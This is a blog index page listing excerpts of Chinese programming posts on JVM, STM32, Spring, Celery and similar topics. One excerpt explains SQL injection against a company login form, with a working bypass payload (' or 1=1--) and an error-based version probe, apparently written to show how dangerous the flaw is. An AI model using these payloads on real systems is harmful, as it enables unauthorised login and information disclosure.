<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4fa5848e7ffcbf1c58a351d20a7e721f/" rel="bookmark">
			学习jvm有什么用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 走进JVM 一、JVM是什么？1.学习jvm有什么用1.JVM故障排查2.JVM调优 一、JVM是什么？ 1.学习jvm有什么用 1.JVM故障排查 jvm常用命令
jvm监控工具的作用
2.JVM调优 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c6c8c2ee8963d304e38a7236015a76c/" rel="bookmark">
			sql注入实例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前阵子发现公司的网站有SQL注入漏洞，向项目经理提了以后，得到的答复异常的冷淡：“早就知道，这种asp的网站肯定有漏洞，要是Asp.net的网站就没问题”，先暂不评价此说法对错，如此冷淡的反应只能说明了对SQL注入的无知，今天就通过这个实例来告诉大家SQL注入究竟有多大的危害。
初步注入--绕过验证，直接登录
公司网站登陆框如下：
可以看到除了账号密码之外，还有一个公司名的输入框，根据输入框的形式不难推出SQL的写法如下：
1SELECT * From Table WHERE Name='XX' and Password='YY' and Corp='ZZ'; 我发现前两者都做一些检查，而第三个输入框却疏忽了，漏洞就在这里！
注入开始，在输入框中输入以下内容：
用户名乱填，密码留空，这种情况下点击登录按钮后竟然成功登录了。我们看一下最终的SQL就会找到原因：
1SELECT * From Table WHERE Name='SQL inject' and Password='' and Corp='' or 1=1--'; 从代码可以看出，前一半单引号被闭合，后一半单引号被“--”给注释掉，中间多了一个永远成立的条件“1=1”，这就造成任何字符都能成功登录的结果。而Sql注入的危害却不仅仅是匿名登录。
中级注入--借助异常获取信息。
现在我们在第三个输入框中写入：“‘ or 1=(SELECT @@version) –”。如下：
后台的SQL变成了这样：
1SELECT * From Table WHERE Name='SQL inject' and Password='' and Corp='' or 1=(SELECT @@VERSION)--'; 判断条件变成了 1=(SELECT @@VERSION),这个写法肯定会导致错误，但出错正是我们想要的。点击登录后，页面出现以下信息：
Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2008 (SP3) - 10.0.5500.0 (X64) Sep 21 2011 22:45:45 Copyright (c) 1988-2008 Microsoft Corporation Developer Edition (64-bit) on Windows NT 6.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7c6c8c2ee8963d304e38a7236015a76c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7589a888725adca411a0ba3e0eb10e9/" rel="bookmark">
			[ C语言 ] 用C语言实现小游戏 ---- 三子棋 代码 &#43; 解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 本篇文章记录了用C语言实现三子棋小游戏，主要目的是对之前C语言知识学习的巩固，联系各个知识，以及怎么样实际使用各个知识。
一、三子棋的游戏规则 玩家将会看到一个3X3的网格棋盘，默认玩家先下棋，电脑后下棋。
规定：先连成一条直线（3个棋子）的玩家获胜，行，列，对角线均可。若在棋盘下满时仍未分出胜负，则为平局
二、使用到的头文件 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;time.h&gt; 定义3*3的棋盘 #define ROW 3 #define COL 3 初始化棋盘： void InitBoard(char board[ROW][COL],int row,int col); 打印棋盘： void DisplayBoard(char board[ROW][COL], int row, int col); 玩家下棋： void player_move(char board[ROW][COL], int row, int col); 电脑下棋： void computer_move(char board[ROW][COL], int row, int col); 判断输赢： //玩家赢 - '*' //电脑赢 - '#' //平局 - 'Q' //继续 - 'C' char is_win(char board[ROW][COL],int row,int col); 三、游戏的测试 主函数: int main() { test();//调用test测试函数 return 0; } test函数： void test() { int input = 0; srand((unsigned int)time(NULL)); do { menu(); printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e7589a888725adca411a0ba3e0eb10e9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2120e98211ef173d08bf35f4ade2ff85/" rel="bookmark">
			寄存器操作的方法实现两个LED灯的交替闪烁
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 STM32标准固件库简介
代码以C语言开发
目录结构
页面配置
Proteus中仿真实现
STM32标准固件库简介 stm32f10x.h 这个头文件实现了片上外设的所以寄存器的映射，是一个非常重要的头文件，在内核中与之相对应的头文件是 core_cm3.h 。 system_stm32f10x.c 实现了 STM32 的时钟配置，操作的是片上 的 RCC 这个外设。系统在上电之后，首选先会执行由汇编编写的 启动文件，启动文件中的复位函数中调用的 SystemInit 函数就在 这个文件里面定义。调用完之后，系统的时钟就被初始化成 72M 。 如果后面我们需要重新配置系统时钟，我们就可以参考这个函数 重写。为了维持库的完整性，我们不会直接在这个文件里面修改 时钟配置函数。 stm32f10x_it.c 这个文件是专门用来编写中断服务函数的，在我 们修改前，这个文件已经定义了一些系统异常 ( 特殊中断 ) 的接口， 其它普通中断服务函数由我们自己添加。但是我们怎么知道这些中 断服务函的接口如何写？在学习中断和启动文件的时候会详细介 绍。 stm32f10x_conf.h 这个文件被包含进 stm32f10x.h 文件。当我们使 用固件库编程的时候，如果需要某个外设的驱动库，就需要包含该 外设的头文件： stm32f10x_ppp.h ，包含一个还好，如果是用了多外 设，就要包含多个头文件，这不仅影响代码美观也不好管理，现 我们用一个头文件 stm32f10x_conf.h 把这些外设头文件都包含在里面， 让这个配置头文件统一管理这些外设头文件，我们在应用程序中只 要包含这个配置头文件即可，我们又知道这个头文件在 stm32f10x.h的最后被包含，所以最终我们只需要包含 stm32f10x.h 这个头文件即 可，非常方便。默认情况下是所以头文件都被包含，没有被注释掉。 代码以C语言开发 delay_ms.c： #include "stm32f10x.h" void delay_ms(uint32_t CntDwn) { for( ; CntDwn != 0; CntDwn--); } delay_ms.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2120e98211ef173d08bf35f4ade2ff85/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64963e8280e014ef996ddd5543b68cab/" rel="bookmark">
			ubuntu18创建root账户
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.在普通账户下输入：
sudo passwd root 然后会提示你输入当前账户的密码，密码正确后您就可以输入你要创建的root账户的密码。
2.如何从普通账户转换到root账户
su root 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/307c764fcc62dcc9dda784d0d65e6bf6/" rel="bookmark">
			.idea文件冲突导致git checkout分支失败
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于没有忽略本地的.idea文件导致分支切换的时候出现冲突失败
解决方案如下：
（1）首先删除本地的.idea文件
git rm -r --cached .idea/* (2)将.idea文件加入到.gitignore中
vim .gitignore #加入 .idea/ 经过上述两个步骤，即可处理掉冲突
如果不慎在创建.gitignore文件之前就push了项目，那么即使你在.gitignore文件中写入新的过滤规则，这些规则也不会起作用，Git仍然会对所有文件进行版本管理。
简单来说，出现这种问题的原因就是Git已经开始管理这些文件了，所以你无法再通过过滤规则过滤它们。因此一定要养成在项目开始就创建.gitignore文件的习惯，否则一旦push，处理起来会非常麻烦。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cb9b961143c3d67bb849c260ad324d79/" rel="bookmark">
			依赖注入（DI）的三种方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		个人对依赖注入的理解是：为bean所代表的对象的属性赋值 。对象的属性有多种类型，主要包括基本数据类型、String、引用类型、集合类型、属性类型、空字符串以及空值null。在通过配置文件进行依赖注入时，主要有以下三种配置方式：
1. 有参构造器注入 这种方式的前提是，在bean所对应的类中显式定义有参构造函数，涉及到的属性才能够使用&lt;constructor-arg/&gt;标签进行赋值。具体参照链接Spring IOC（控制反转）_鲸鱼-D的博客-CSDN博客中IOC创建对象方式中的方式2。
2.Set方式注入（重点） 前提： 类中有无参构造函数（默认or显式定义）以及setter方法。
Student类：类中的成员属性包括各种数据类型的变量 public class Student { private String name; private Address address; private String[] books; private List&lt;String&gt; hobbies; private Map&lt;String, String&gt; card; private Set&lt;String&gt; games; private String wife1; private String wife2; private Properties info; public String getName() { return name; } public void setName(String name) { this.name = name; } public Address getAddress() { return address; } public void setAddress(Address address) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cb9b961143c3d67bb849c260ad324d79/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f3130ceed54d308e532dad2e497c2e91/" rel="bookmark">
			Flask&#43;Celery&#43;Redis实现队列化异步任务
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概述： 我们考虑一个场景，公司有一个需求，现在需要做一套web系统，而这套系统某些功能需要使用一些开源工具的sdk和api，或是运行一些耗时比较大的任务（单个大任务下可能有多个小任务），需要一段时间才能提供执行结果，而前端同事要求不能让用户在页面等待，需要马上提供一个返回结果给他，任务执行完后可以拿到最终结果，并且用户退出web界面或浏览器异常关闭之后，再次返回界面，执行的过程不会中断，并且支持多用户同时执行不同操作的需要。
很明显，这是一个-异步多线程-的场景，在Python中可以想到的有：
1.引入Asyncio模块，利用多协程实现。
2.使用Threading模块，自己编写线程任务，线程等待，睡眠，释放线程的过程。
3.使用异步框架，例如Celery、Tornado、Twisted等等，装饰异步任务。
这里边最便捷且开发效率最高的应该是使用异步框架，咱们选择使用Celery来实现这个需求。
Celery介绍： 截图与描述来自celery官网：Celery - Distributed Task Queue — Celery 5.2.0 documentation
Celery 是一个简单、灵活且可靠的分布式系统，用于处理大量消息，同时为操作提供维护此类系统所需的工具。
它是一个专注于实时处理的任务队列，同时也支持任务调度。
Celery 拥有庞大而多样化的用户和贡献者社区，您应该加入我们的 IRC 或我们的邮件列表。
Celery 是开源的，并在BSD 许可下获得许可。
消费者与消费结果： 我们除了需要Celery做异步任务的处理，还需要一个中间件来充当消费者，并保存最终的任务处理结果（消费结果），这里有很多中间件可以选，例如常用的消息中间件，rabbitmq，kafka等，还可以使用mysql，redis等作为消费者并保存消费结果（因为最终的处理结果要返回给前端同事），楼主最终选择了redis。
Redis安装与配置： 这里不再赘述windows下安装redis步骤，只介绍linux下安装redis与配置，我的机器是centos7.6：
yum方式安装（注意：这样安装的redis不是最新版本的，如有对版本要求比较高的，建议去官网下载源码包去手动安装，官网地址：Redis，最新版本：6.2.6）
yum -y install redis 安装完成之后配置redis.conf文件：
vi /etc/redis.conf 修改这一行，改成 0.0.0.0，这样别的应用和组件才可以访问到redis的服务与端口:
同理，redis的默认端口也可以在此配置里修改：
还有一些关闭匿名访问，设置密码等配置的修改，项目若要上到公网环境下，建议配置。
启动并测试redis服务功能是否正常：
启动redis: redis-cli -h 0.0.0.0 测试redis:
1 redis&gt; set name "zzz" 2 3 OK 4 5 redis&gt; get name 6 7 "zzz" 记住，代码并没有实际引用redis，但也需要安装redis模块，否则会报错。（redis模块版本不要太高，高了也会报错，这些坑都是楼主亲自趟过的，我这里使用2.10.6）
pip install redis==2.10.6 Celery的安装和配置： windos和linux下都可以使用pip安装：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f3130ceed54d308e532dad2e497c2e91/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fdb6fbe9654ec03e078deb00b811178a/" rel="bookmark">
			现代大学英语精读第二版（第五册）学习笔记（原文及全文翻译）——1 - Who Are you and what are you doing here?（你们是谁？来这儿做什么？）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Unit 1 - Who Are you and what are you doing here? Who Are you and what are you doing here?
Mark Edmundson
Welcome and congratulations: Getting to the first day of college is a major achievement. You're to be commended, and not just you, but the parents, grandparents, uncles, and aunts who helped get you here.
It's been said that raising a child effectively takes a village: Well, as you may have noticed, our American village is not in very good shape.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fdb6fbe9654ec03e078deb00b811178a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f21490d728a77a654dc773c54046e49c/" rel="bookmark">
			关于Matlab小波工具箱打开.mat文件为一条递增斜线问题的解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 近期研究了一下 的仿真模型的搭建，但在使用小波工具箱分析时发现，我将仿真的信号图保存为 格式的文件后，在小波工具箱中打开，发现图像是一条递增的斜线（似乎是时间的递增），解决这个问题的具体步骤是什么？本文将要解决的就是上述描述的这种问题。
目录
1 问题引入
2 解决策略
3 参考文献
1 问题引入 提前搭建了一个模拟电压暂降数据信号的仿真波形图：
在将要使用小波工具箱进行波形分析时，发生了这样的问题：在小波工具箱中打开，发现图像是一条递增的斜线：
相信遇到这个问题的小伙伴很是头疼，明明辛苦搭建好的波形仿真图，这变量保存好到小波工具箱咋就不行了呢。
别慌，本文第 部分将阐述该问题的解决方案。
2 解决策略 产生这样的问题主要原因是数据变量没选对！
所以首先想到的应该是如何将 中 数据保存至 中。
点击 按照下图所示进行设置：
返回 点击 运行：
这样在工作区就可以看到我们想保存的数据啦
双击 数据后在左边显示内容中再双击 变量
这样我们就获得目标变量数据 了
这时又有个问题： 变量是一个三维变量数据，而我们要获得的是一个二维数据，所以接下来就要降维：
命令行先后键入：
data = squeeze(ScopeData.signals.values) % 压缩维度，三维变二维 D = permute(data, [2 1]) % 调整二维数据的维度顺序 这样我们就获得了最终想要的数据变量 ：
下面首先验证一下该数据变量 是否能画出 中的仿真图像：
接下来就可以进行小波工具箱分析啦
依次点击下图所示按钮： 至此，该问题就解决了：
3 参考文献 Simulink中Scope数据保存至Workspace制图 - Siwei_Yang - 博客园
欢迎留言，一起学习交流！ END 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ad64e2f50627b03174b34ef2d76d8a9/" rel="bookmark">
			中国大部分地区整体匀色镶嵌，如何去除黑边，修复偏色，消除影像色差，使整体颜色一致
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		——中国大部分地区整体匀色镶嵌处理
安排~
² 解决方案
使用“计算有效”功能，去除黑边和杂边；使用色彩匹配功能消除偏色，使用“色彩匹配”、“色阶”、“直方图曲线”和“Camera Raw调色”去除影像色差；使用“距离羽化”消除接缝线；使用高级输出功能，输出整体匀色镶嵌一张图。
原图情况 原图数据比较多，覆盖中国绝大多数地区，每个影像都存在无效的黑边需要去除，有的影像明显和周围影像不是一个季节，色差明显；需要去除黑边，并且去除影像之间因不同季节引起的色差；还有的影像和周围影像之间存在亮度差异，需要消除亮度差异。
去除黑边
计算有效区域之后，自动将无效的黑边去除，全图显示时可以看到影像之间还有黑色缝隙，这个黑色缝隙是因为缩小显示导致，放大就没有了，不影响输出结果。
去除偏色
使用“颜色匹配”功能，将有偏色的图像与参考图层进行匹配，实现偏色图层的颜色改正；通常选择偏色图层周边最近的正常的图层，作为参考图层。
去除亮度差
距离羽化，消除接缝线 通过设置“距离羽化”，实现接缝线两侧自然过渡；羽化距离大小根据重叠大小情况进行设置，过大或者过小都会有不同的效果。
，时长00:45
输出一张图
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48f58614fe52e6910bf05277f4b4f7e8/" rel="bookmark">
			你知道怎么用STM32控制舵机吗？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		以下文章来源于：公_众_号开源电子网
读取更多技术文章，请扫码关注
你知道怎么用STM32控制舵机吗？ 本文我们来学习下如何使用STM32去控制舵机旋转相应角度。
舵机介绍 舵机实质上可以看作一个伺服电机，它也有驱动电路、控制电路，只不过一般舵机工作范围只旋转一定的角度，最常见的就是180°的舵机，当然也有360°的舵机，这里只以180°舵机为例
图1：SG90舵机
舵机内部结构 舵机主要由以下几个部分组成，减速齿轮组、位置反馈电位计、直流电机、内部控制电路板
当直流电机接收到脉冲指令就会开始转动，之后带动减速齿轮组，减速齿轮组会带动下方接的电位器，之后控制板读取到电位器的信号变化，就可以知道当前舵机旋转的角度，这样就形成了一个闭环回路。
舵机控制 舵机的控制一般需要一个20ms的脉宽调制（PWM）信号，该脉冲的高电平部分一般为0.5ms-2.5ms范围相对应舵盘位置的0-180°，那么对应的控制关系如下：
0.5ms--------------0度
1.0ms--------------45度
1.5ms--------------90度
2.0ms--------------135度
2.5ms--------------180度
舵机与脉冲高电平时间关系动图（周期20ms）：
一般舵机有三根信号线
棕色表示GND，
红色表示VCC，
橙色表示信号脚（即脉冲输入引脚）
代码实现 那我们知道了舵机的控制原理了，我们只需要使用STM32的定时器外设不断输出周期为20ms的脉冲信号，且控制高电平时间在0.5ms - 2.5ms之间即可控制舵机旋转角度了。
本文将使用STM32F407，TIM8_CH1输出脉冲控制舵机
CubeMX配置
这样就配置好不断输出周期20ms脉冲信号了
代码编写：
①启动TIM8_CH1的脉冲输出；
②在while里边，每秒修改高电平持续时间
0.5ms对应0°，
1ms对应45°，
1.5ms对应90°，
2ms对应135°，
2.5ms对应180°。
这样就大功告成了！！！大家有问题可以留言，或者留下你们想看的内容。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/be86de6418c3761330dbe3dcb4d268e3/" rel="bookmark">
			vcftools手册重要参数集合
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在之前的一篇文章中，我们用到了vcftools来过滤得到的原始vcf文件，不过由于时间关系，过滤的参数还有待优化。其实我后来请教了师兄师姐，得知我们应当先了解vcftools的具体参数，然后选择自己所需参数去过滤数据，随后根据跑出来的树的结果不断调整范围直至吻合心目中理想的结果。
所以我去看了原版的vcftools使用手册VCFtools
然后总结了一些对于我来说比较用得上的，下面结合最近的计算结果写一写。
首先是一些基本选项：
•输入文件选项，用以定义需要过滤的VCF文件，例： --vcf filename 如果文件是压缩的，那么可以输入
--gzvcf filename 输出文件选项，为vcftools生成的所有文件定义输出文件名前缀： --out output_prefix 如果省略此步骤那么默认生成的文件在当前工作目录中具有前缀“out.”
筛选位点参数 排除标识符与&lt;染色体&gt;匹配的位点
--not-chr &lt;chromosome&gt; 保留具有匹配ID的SNP（例如dbSNP rsID）。此命令可以多次使用，以保留多个SNP。
--snp &lt;string&gt; 包括或排除文件中给定的SNP列表。该文件应包含SNP ID列表（例如dbSNP RSID），每行一个ID。不需要标题行。
--snps &lt;filename&gt; --exclude &lt;filename&gt; 仅包括次要等位基因计数大于或等于“-mac”值且小于或等于“-max mac”值的位点。
--mac &lt;integer&gt; --max-mac &lt;integer&gt; 仅包括次要等位基因频率大于或等于“-maf”值且小于或等于“-max maf”值的位点。
--maf &lt;float&gt; --max-maf &lt;float&gt; 仅包括平均深度值（包括所有个体）大于或等于“-min meanDP”值且小于或等于“-max meanDP”值的场地。
--min-meanDP &lt;float&gt; --max-meanDP &lt;float&gt; 根据Wigginton, Cutler and Abecasis (2005)的定义，使用精确测试评估Hardy-Weinberg平衡点。p值低于此选项定义的阈值的站点被视为不在HWE范围内，因此被排除在外。
--hwe &lt;float&gt; 根据缺失数据的比例排除站点（定义为介于0和1之间，其中0表示完全缺失的站点，1表示不允许缺失数据）。
--max-missing &lt;float&gt; 仅包括质量值高于此阈值的站点。
--minQ &lt;float&gt; 提供包含要在后续分析中包括或排除的个人列表的文件。每个单独的ID（如VCF标题行中的定义）应包含在单独的行中。如果两个选项都使用，则在“-remove”选项之前执行“-keep”选项。提供多个文件时，将保留所有保留文件中的个人联合减去所有删除文件中的个人联合。不需要标题行。 --keep &lt;filename&gt; --remove &lt;filename&gt; 仅包括大于或等于“-minDP”值且小于或等于“-maxDP”值的基因型。此选项要求为所有站点指定“DP”格式标签。 --minDP &lt;float&gt; --maxDP &lt;float&gt; 输出统计结果 输出后缀为“ .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/be86de6418c3761330dbe3dcb4d268e3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8e3f32d1b61bf231f36705d2a4a9e65/" rel="bookmark">
			C#在unity上实现双指缩放
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这个只是实现了双指缩放，至于单指挪动的，是用unity的SCrollView实现的，只需要单指的时候，打开ScrollView，双指的时候，关闭ScrollView就行，如果不关闭的话，ScrollView的平移会和C#中的逻辑产生冲突。TRACE.TraceLn这个是打印日志的，可以忽略。这个感觉还是可以讨论的，当初在网上搜的时候，也是都没有说的很具体，就只能自己摸索，自己尝试。
namespace rkt.UI { public class InputTouchScale : MonoBehaviour { public Image mOriginTexture; public Image mBaseSize; public ScrollRect m_scrollRect; public float fRate = 1000f; private Touch oldTouch1; //上次触摸点1(手指1) private Touch oldTouch2; //上次触摸点2(手指2) void Update() { //float scaleFactor = 0f; //#if UNITY_EDITOR || UNITY_STANDALONE_WIN //scaleFactor = Input.GetAxis("Mouse ScrollWheel"); //if (!m_scrollRect.isActiveAndEnabled) //{ // m_scrollRect.enabled = true; //} //#else TRACE.TraceLn("双指缩放地图"); //没有触摸 if (Input.touchCount &lt;= 1) { if (!m_scrollRect.isActiveAndEnabled) { m_scrollRect.enabled = true; } TRACE.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f8e3f32d1b61bf231f36705d2a4a9e65/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1bb38e1ce047618fb34eedc0b7949616/" rel="bookmark">
			Linux Opencv 环境搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux Opencv 环境搭建
1.换源：
cd /etc/apt
sudo gedit sources.list
将里面内容替换为阿里云的源： deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1bb38e1ce047618fb34eedc0b7949616/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3465f8175fc5da234aceef9324742d44/" rel="bookmark">
			基于HAL库的STM32以DMA方式实现的连续发送
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、DMA 1、概念 直接存储器访问(DMA)： 用于在外设与存储器之间以及存储器与存储器之间进行高速数据传输。DMA传输过程的初始化和启动由CPU完成，传输过程由DMA控制器来执行，无需CPU参与，从而节省CPU资源，提高利用率。
2、DMA的数据传输四要素 传输源:DMA数据传输的来源传输目标:DMA数据传输的目的传输数量:DMA传输数据的数量触发信号:启动一次DMA数据传输的动作 3.、DMA控制器特点 STM32F411微控制器具备两个DMA控制器:DMA1和DMA2，每个控制器有8个数据流，每个数据流可以映射到8个通道(或请求);
每一个DMA控制器用于管理一个或多个外设的存储器访问请求，并通过总线仲裁器来协调各个DMA请求的优先级;
数据流(stream)是用于连接传输源和传输目标的数据通路，每个数据流可以配置为不同的传输源和传输目标，这些传输源和传输目标称为通道(Channel)
具备16字节的FIFO。使能FIFO功能后，源数据先送入FIFO，达到FIFO的触发阈值后，再传送到目标地址。
4、数据传输方式 普通模式：传输结束后(即要传输数据的数量达到零)，将不再产生DMA操作。若开始新的DMA传输，需在关闭DMA通道情况下，重新启动DMA传输。
循环模式：可用于处理环形缓冲区和连续数据流（例如ADC扫描模式)。当激活循环模式后，每轮传输结束时，要传输的数据数量将自动用设置的初始值进行加载，并继续响应DMA请求。
5、 HAL库DMA发送函数 函数主体：
HAL_StatusTypeDef HAL_UART_Transmit_DMA(UART_HandleTypeDef *huart, uint8_t *pData, uint16_t Size) { uint32_t *tmp; /* Check that a Tx process is not already ongoing */ if(huart-&gt;gState == HAL_UART_STATE_READY) { if((pData == NULL ) || (Size == 0U)) { return HAL_ERROR; } /* Process Locked */ __HAL_LOCK(huart); huart-&gt;pTxBuffPtr = pData; huart-&gt;TxXferSize = Size; huart-&gt;TxXferCount = Size; huart-&gt;ErrorCode = HAL_UART_ERROR_NONE; huart-&gt;gState = HAL_UART_STATE_BUSY_TX; /* Set the UART DMA transfer complete callback */ huart-&gt;hdmatx-&gt;XferCpltCallback = UART_DMATransmitCplt; /* Set the UART DMA Half transfer complete callback */ huart-&gt;hdmatx-&gt;XferHalfCpltCallback = UART_DMATxHalfCplt; /* Set the DMA error callback */ huart-&gt;hdmatx-&gt;XferErrorCallback = UART_DMAError; /* Set the DMA abort callback */ huart-&gt;hdmatx-&gt;XferAbortCallback = NULL; /* Enable the UART transmit DMA Stream */ tmp = (uint32_t*)&amp;pData; HAL_DMA_Start_IT(huart-&gt;hdmatx, *(uint32_t*)tmp, (uint32_t)&amp;huart-&gt;Instance-&gt;DR, Size); /* Clear the TC flag in the SR register by writing 0 to it */ __HAL_UART_CLEAR_FLAG(huart, UART_FLAG_TC); /* Process Unlocked */ __HAL_UNLOCK(huart); /* Enable the DMA transfer for transmit request by setting the DMAT bit in the UART CR3 register */ SET_BIT(huart-&gt;Instance-&gt;CR3, USART_CR3_DMAT); return HAL_OK; } else { return HAL_BUSY; } } 功能描述： 在DMA方式下发送一定数量的数据
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3465f8175fc5da234aceef9324742d44/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e21ec2d245f48a571c5e9265249e63f/" rel="bookmark">
			1.JavaScript的简介概要
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 有兴趣的话可以读一下: JavaScript 诞生于 1995 年。当时，它的主要目的是处理以前由服务器端语言（如 Perl）负责的一 些输入验证操作。 在 JavaScript 问世之前，必须把表单数据发送到服务器端才能确定用户是否 没有填写某个必填域，是否输入了无效的值。 Netscape Navigator 希望通过 JavaScript 来解决这个问题。 在人们普遍使用电话拔号上网的年代，能够在客户端完成一些基本的验证任务绝对是令人兴奋的。毕竟， 拨号上网的速度之慢，导致了与服务器的每一次数据交换事实上都成了对人们耐心的一次考验。 自此以后，JavaScript 逐渐成为市面上常见浏览器必备的一项特色功能。 如今，JavaScript 的用途早 已不再局限于简单的数据验证，而是具备了与浏览器窗口及其内容等几乎所有方面交互的能力。 今天的 JavaScript 已经成为一门功能全面的编程语言，能够处理复杂的计算和交互，拥有了闭包、匿名（lamda， 拉姆达）函数，甚至元编程等特性。 作为 Web 的一个重要组成部JavaScript 的重要性是不言而喻的， 就连手机浏览器，甚至那些专为残障人士设计的浏览器等非常规浏览器都支持它。当然，微软的例子更 为典型。虽然有自己的客户端脚本语言 VBScript，但微软仍然在 Internet Explorer 的早期版本中加入了 自己的 JavaScript 实现。 JavaScript 从一个简单的输入验证器发展成为一门强大的编程语言，完全出乎人们的意料。 应该说， 它既是一门非常简单的语言，又是一门非常复杂的语言。 说它简单，是因为学会使用它只需片刻功夫； 而说它复杂，是因为要真正掌握它则需要数年时间。要想全面理解和掌握 JavaScript，关键在于弄清楚 它的本质、历史和局限性。 更多参看MDN
